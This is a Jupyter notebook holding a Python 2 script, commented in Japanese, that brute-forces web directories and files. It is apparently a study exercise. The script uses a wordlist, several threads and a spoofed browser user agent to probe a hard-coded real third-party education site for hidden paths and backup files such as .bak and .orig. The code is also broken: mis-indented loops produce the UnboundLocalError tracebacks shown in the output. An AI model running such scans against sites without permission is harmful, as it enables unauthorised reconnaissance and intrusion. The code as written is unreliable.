{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true,
    "deletable": true,
    "editable": true
   },
   "outputs": [],
   "source": [
    "import urllib2\n",
    "import urllib\n",
    "import threading\n",
    "import Queue"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Exception in thread Thread-21:\n",
      "Traceback (most recent call last):\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 801, in __bootstrap_inner\n",
      "    self.run()\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 754, in run\n",
      "    self.__target(*self.__args, **self.__kwargs)\n",
      "  File \"<ipython-input-6-42f9f44f8cf6>\", line 40, in dir_bruter\n",
      "    attempt_list.append(\"/%s%s\" % (attempt,extension))\n",
      "UnboundLocalError: local variable 'attempt_list' referenced before assignment\n",
      "Exception in thread Thread-20:\n",
      "Traceback (most recent call last):\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 801, in __bootstrap_inner\n",
      "    self.run()\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 754, in run\n",
      "    self.__target(*self.__args, **self.__kwargs)\n",
      "  File \"<ipython-input-6-42f9f44f8cf6>\", line 40, in dir_bruter\n",
      "    attempt_list.append(\"/%s%s\" % (attempt,extension))\n",
      "UnboundLocalError: local variable 'attempt_list' referenced before assignment\n",
      "Exception in thread Thread-22:\n",
      "Traceback (most recent call last):\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 801, in __bootstrap_inner\n",
      "    self.run()\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 754, in run\n",
      "    self.__target(*self.__args, **self.__kwargs)\n",
      "  File \"<ipython-input-6-42f9f44f8cf6>\", line 40, in dir_bruter\n",
      "    attempt_list.append(\"/%s%s\" % (attempt,extension))\n",
      "UnboundLocalError: local variable 'attempt_list' referenced before assignment\n",
      "Exception in thread Thread-23:\n",
      "Traceback (most recent call last):\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 801, in __bootstrap_inner\n",
      "    self.run()\n",
      "  File \"/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py\", line 754, in run\n",
      "    self.__target(*self.__args, **self.__kwargs)\n",
      "  File \"<ipython-input-6-42f9f44f8cf6>\", line 40, in dir_bruter\n",
      "    attempt_list.append(\"/%s%s\" % (attempt,extension))\n",
      "UnboundLocalError: local variable 'attempt_list' referenced before assignment\n",
      "\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "threads        = 5\n",
    "target_url     = \"http://iempt.emedu.org.tw\"\n",
    "wordlist_file  = \"all.txt\" # SVNDiggerから\n",
    "resume         = None\n",
    "user_agent     = \"Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0\"\n",
    "\n",
    "def build_wordlist(wordlist_file):\n",
    "# 単語の辞書を読み取る\n",
    "    fd = open(wordlist_file,\"rb\")\n",
    "    raw_words = fd.readlines()\n",
    "    fd.close()\n",
    "    found_resume = False\n",
    "    words        = Queue.Queue()\n",
    "    for word in raw_words:\n",
    "        word = word.rstrip()\n",
    "    if resume is not None:\n",
    "        if found_resume:\n",
    "            words.put(word)\n",
    "        else:\n",
    "            if word == resume:\n",
    "                found_resume = True\n",
    "                print(\"Resuming wordlist from: %s\" % resume)\n",
    "    else:\n",
    "        words.put(word)\n",
    "    return words\n",
    "\n",
    "def dir_bruter(extensions=None):\n",
    "    while not word_queue.empty():\n",
    "        attempt = word_queue.get()\n",
    "        attempt_list = []\n",
    "# ファイル拡張子があるかどうかチェックする。もしなければディレクトリの\n",
    "# パスとして総当たり攻撃の対象とする。\n",
    "        if \".\" not in attempt:\n",
    "            attempt_list.append(\"/%s/\" % attempt)\n",
    "        else:\n",
    "            attempt_list.append(\"/%s\" % attempt)\n",
    "# 拡張子の総当たりをしたい場合\n",
    "    if extensions:\n",
    "        for extension in extensions:\n",
    "            attempt_list.append(\"/%s%s\" % (attempt,extension))\n",
    "    # 作成したリストの最後まで繰り返す\n",
    "    for brute in attempt_list:\n",
    "        url = \"%s%s\" % (target_url,urllib.quote(brute))\n",
    "        try:\n",
    "            headers = {}\n",
    "            headers[\"User-Agent\"] = user_agent\n",
    "            r = urllib2.Request(url,headers=headers)\n",
    "            response = urllib2.urlopen(r)\n",
    "            if len(response.read()):\n",
    "                print \"[%d] => %s\" % (response.code,url)\n",
    "        except urllib2.HTTPError,e:\n",
    "            if e.code != 404:\n",
    "                print \"!!! %d => %s\" % (e.code,url)\n",
    "            pass\n",
    "        \n",
    "word_queue = build_wordlist(wordlist_file)\n",
    "extensions = [\".php\",\".bak\",\".orig\",\".inc\"]\n",
    "for i in range(threads):\n",
    "    t = threading.Thread(target=dir_bruter,args=(extensions,))\n",
    "    t.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true,
    "deletable": true,
    "editable": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
